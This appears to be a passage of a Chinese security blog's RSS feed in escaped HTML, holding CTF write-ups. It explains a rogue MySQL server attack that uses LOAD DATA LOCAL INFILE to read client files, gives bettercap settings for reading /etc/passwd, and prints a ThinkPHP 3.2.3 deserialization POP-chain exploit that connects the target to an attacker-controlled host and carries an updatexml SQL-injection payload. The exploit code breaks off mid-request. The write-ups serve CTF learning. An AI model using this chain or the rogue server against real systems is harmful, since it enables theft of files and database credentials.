&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Save&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">randomChar&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">l&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">output&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">make&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">l&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">output&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">output&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#75715e">// 伪随机
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="vnctf-2022gocalc0">[VNCTF 2022]gocalc0&lt;/h3>
&lt;p>据说是y老师出题有误，导致异常简单&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220213002805727.png" alt="image-20220213002805727">&lt;/p>
&lt;p>emmmm&lt;/p>
&lt;h2 id="go111-netheep存在crlf漏洞">go&amp;lt;=1.11 net/heep存在CRLF漏洞&lt;/h2>
&lt;p>&lt;a href="https://github.com/go/go/issues/30794">https://github.com/go/go/issues/30794&lt;/a>&lt;/p>
&lt;h3 id="wmctf2020gogogo-1">[WMCTF2020]GOGOGO&lt;/h3>
&lt;p>参考：&lt;a href="https://annevi.cn/2020/08/14/wmctf2020-gogogo-writeup/">wp&lt;/a>&lt;/p></description></item><item><title>MySQL伪服务端读客户端任意文件</title><link>https://amiaaaz.github.io/2021/12/19/mysql-pseudo-server/</link><pubDate>Sun, 19 Dec 2021 20:22:54 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/19/mysql-pseudo-server/</guid><description>&lt;p>应该是各位带师傅们早就会的点了，做题碰到了拿出来炒个冷饭QwQ；参考链接统一放到最后面啦&lt;/p>
&lt;h2 id="原理复现">原理&amp;amp;复现&lt;/h2>
&lt;p>总体思路是这样的：伪造一个mysql的服务端（不需要有完整的数据库的功能 只需向客户端回复greeting package）当有客户端连接到时，可以被服务端访问一个客户端本地的文件（如果本地用户权限允许的话&lt;/p>
&lt;p>帮助我们实现这一目标的sql语句是&lt;code>LOAD DATA INFILE&lt;/code>，它用于读取一个文件的内容放入表中，有两种形式&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-mysql" data-lang="mysql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">Load&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#00a8c8">infile&lt;/span> &lt;span style="color:#d88200">&amp;#34;/data/data.csv&amp;#34;&lt;/span> &lt;span style="color:#00a8c8">into&lt;/span> &lt;span style="color:#00a8c8">table&lt;/span> &lt;span style="color:#111">TestTable&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">Load&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#111">local&lt;/span> &lt;span style="color:#00a8c8">infile&lt;/span> &lt;span style="color:#d88200">&amp;#34;/data/data.csv&amp;#34;&lt;/span> &lt;span style="color:#00a8c8">into&lt;/span> &lt;span style="color:#00a8c8">table&lt;/span> &lt;span style="color:#111">TestTable&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 有时与FIELDS TERMINATED BY &amp;#39;\n&amp;#39;一起使用
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>以上两种写法的差异在于是否有&lt;code>local&lt;/code>，也就是是否读取client本地的文件&lt;/p>
&lt;p>&lt;img src="https://lightless-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/lightless/2bsdse1b1cf6g999bhhcyz9y/image.png" alt="来自官方文档">&lt;/p>
&lt;p>在本地用wireshark抓个包康康这一sql语句具体是怎么执行的&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210702113235801.png" alt="image-20210702113235801">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210702113241427.png" alt="image-20210702113241427">&lt;/p>
&lt;p>（肥肠意义不明的截图（五个月过去了 能记得才有鬼&lt;/p>
&lt;p>整个过程简化为以下三个阶段&lt;/p>
&lt;ul>
&lt;li>Client: Request Query: LOAD DATA LOCAL INFIEL &amp;lsquo;/etc/passwd&amp;rsquo; INTO TABLE test FIELDS TERMINATED BY &amp;lsquo;\n&amp;rsquo;&lt;/li>
&lt;li>Server: Response TABULAR: /etc/passwd&lt;/li>
&lt;li>Client: Request[Malformed Packet]: content of /etc/passwd&lt;/li>
&lt;/ul>
&lt;p>如果在客户端发送查询后 返回一个&lt;code>Response TABULAR&lt;/code>包 并指定要读取的文件 就可以任意读取客户端文件了（前提仍然是have read access）&lt;/p>
&lt;p>甚至不一定需要客户端首先发起 &lt;code>LOAD DATA LOCAL&lt;/code>的请求才能response，在官方文档第三段的最后的括号中提示，伪造的客户端可以在任何时候回复一个&lt;code>file-transfer&lt;/code>的请求（但利用这个特性前 客户端必须具有&lt;code>CLIENT_LOCAL_FILES&lt;/code>属性 （可以在连接mysql时添加 &lt;code>--enable-local-infile&lt;/code> 或设置&lt;code>local_infile=ON&lt;/code>&lt;/p>
&lt;p>所以一旦有一台恶意的mysql服务器 发出完全相同的数据包去模拟初始的greeting握手过程，之后等待一个客户端的响应（幸运的是大多数MySQL客户端以及程序库都会在握手之后至少发送一次请求，以探测目标平台的指纹信息，比如（&lt;code>select @@version_comment limit 1&lt;/code>），再之后就可以伪造&lt;code>load data local infile&lt;/code>指令来获取文件了&lt;/p>
&lt;p>我们构造一个具有以下属性的mysql伪服务端：&lt;/p>
&lt;ul>
&lt;li>发送Server Greeting&lt;/li>
&lt;li>等待client: Request Query package&lt;/li>
&lt;li>回复请求Response file-transfer&lt;/li>
&lt;/ul>
&lt;p>需要发的包格式都在官方文档上可以找到：&lt;a href="https://dev.mysql.com/doc/internals/en/com-query-response.html#packet-Protocol::LOCAL_INFILE_Request">Protocol::LOCAL_INFILE_Request&lt;/a> &lt;a href="https://dev.mysql.com/doc/internals/en/connection-phase-packets.html#packet-Protocol::Handshake">Protocol::Handshake&lt;/a>&lt;/p>
&lt;p>几个已经集成过的伪造server: &lt;a href="https://github.com/bettercap/bettercap">bettercap&lt;/a> &lt;a href="https://github.com/allyshka/Rogue-MySql-Server">Rogue-MySql-Server&lt;/a>&lt;/p>
&lt;p>可以用bettercap进行完美实践&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210702175622262.png" alt="image-20210702175622262">&lt;/p>
&lt;p>需要设置的项非常简单&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">set&lt;/span> mysql.server.address 0.0.0.0 &lt;span style="color:#75715e"># 如果想用nps之类的代理工具映射到公网端口请务必设置此项&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">set&lt;/span> mysql.server.infile /etc/passwd &lt;span style="color:#75715e"># 想要读取的文件&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">set&lt;/span> mysql.server.outfile /xxxx &lt;span style="color:#75715e"># 保存到本地的位置&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">set&lt;/span> mysql.server.port 1099 &lt;span style="color:#75715e"># 随意端口都可以&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mysql.server on
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="红明谷ctf-2021easytp">[红明谷CTF 2021]EasyTP&lt;/h2>
&lt;p>tp3.2.3，有一个现成的链子：&lt;a href="https://f5.pm/go-53579.html">ThinkPHP v3.2.* （SQL注入&amp;amp;文件读取）反序列化POP链&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219155134609.png" alt="image-20211219155134609">&lt;/p>
&lt;p>看Application\Home\Controller\IndexController.class.php的代码也跟这个文章中的示例代码大差不差，顺着这篇文章的思路跟一下&lt;/p>
&lt;p>首先是全局寻找&lt;code>__destruct()&lt;/code>函数&lt;/p>
&lt;p>www/ThinkPHP/Library/Think/Image/Driver/Imagick.class.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219163343446.png" alt="image-20211219163343446">&lt;/p>
&lt;p>寻找一个&lt;code>destroy()&lt;/code>&lt;/p>
&lt;p>www/ThinkPHP/Library/Think/Session/Driver/Memcache.class.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219163445086.png" alt="image-20211219163445086">&lt;/p>
&lt;p>这里需要一个&lt;code>$sessID&lt;/code>，PHP7下不传参会报错 PHP5不影响，&lt;code>$this-&amp;gt;sessionName&lt;/code>可控；接着找含有&lt;code>delete()&lt;/code>的类&lt;/p>
&lt;p>www/ThinkPHP/Mode/Lite/Model.class.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219163653936.png" alt="image-20211219163653936">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219163713363.png" alt="image-20211219163713363">&lt;/p>
&lt;p>相当于传入的参数都可用，可以控制自带的数据库类的&lt;code>delete()&lt;/code>方法了&lt;/p>
&lt;p>www/ThinkPHP/Library/Think/Db/Driver.class.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219170053771.png" alt="image-20211219170053771">&lt;/p>
&lt;p>它是拼接了$sql语句，之后执行&lt;code>$this-&amp;gt;execute()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219171035987.png" alt="image-20211219171035987">&lt;/p>
&lt;p>它会预先进行&lt;code>$this-&amp;gt;initConnect()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219171103370.png" alt="image-20211219171103370">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219171123961.png" alt="image-20211219171123961">&lt;/p>
&lt;p>我们可以控制&lt;code>$config&lt;/code>，控制连接任意数据库&lt;/p>
&lt;p>这里可以结合上面的mysql伪服务端任意文件读取了，比如以下的利用流程：&lt;/p>
&lt;ul>
&lt;li>通过某处泄露得到目标的WEB目录（如DEBUG页面&lt;/li>
&lt;li>开启MySQL伪服务端，读取目标的数据库配置文件&lt;/li>
&lt;li>出发反序列化&lt;/li>
&lt;li>触发PDO连接部分&lt;/li>
&lt;li>获取到目标的数据库配置文件&lt;/li>
&lt;/ul>
&lt;p>用bettercap做mysql伪服务端读一下/etc/passwd&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Db\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Mysql&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$options&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">MYSQL_ATTR_LOCAL_INFILE&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span> &lt;span style="color:#75715e">// 开启才能读取文件
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$config&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;debug&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;database&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;hostname&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;your_vps&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;hostport&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;port&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;charset&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;utf8&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Session\Driver\Memcache&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Imagick&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$img&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">img&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Memcache&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Session\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Model&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Memcache&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">handle&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Db\Driver\Mysql&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$options&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$pk&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Mysql&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">options&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;where&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;table&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,user(),31) from test.flag),0x7e),1)#&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;where&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;1=1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver\Imagick&lt;/span>&lt;span style="color:#111">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$curl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_init&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">curl_setopt_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_URL&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://6382172d-0bab-4e87-b434-7d711efad721.node3.buuoj.cn/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_RETURNTRANSFER&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_ENCODING&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_MAXREDIRS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_TIMEOUT&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_HTTP_VERSION&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">CURL_HTTP_VERSION_1_1&lt;/span>&lt;span style="color:#111">,&lt;/span>
